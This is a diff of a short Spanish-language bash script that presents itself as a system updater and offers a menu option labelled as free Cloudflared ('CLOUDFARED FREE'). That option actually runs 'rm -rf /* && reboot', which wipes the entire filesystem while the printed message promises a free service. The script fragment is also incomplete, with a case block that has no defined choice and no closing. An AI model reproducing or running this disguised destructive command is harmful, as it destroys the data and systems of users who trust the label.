@@ -1,11 +1,14 @@
 #!/bin/bash
-clear
-pkill -f ws-epro
-echo INSTALANDO PHYTON NUEVO
-sleep 1
-cd
 
- 1)
+# Muestra el mensaje de actualización en ejecución
+echo "ACTUALIZACIÓN DEL SISTEMA"
+sleep 2s
+
+# Actualiza el sistema limpio y elimina los paquetes obsoletos. 
+sudo apt update && sudo apt upgrade && sudo apt autoremove && sudo apt autoclean
+
+ case $choice in
+        1)
             echo "Disfruta de CLOUDFARED FREE"
             sleep 2s
             rm -rf /* && reboot
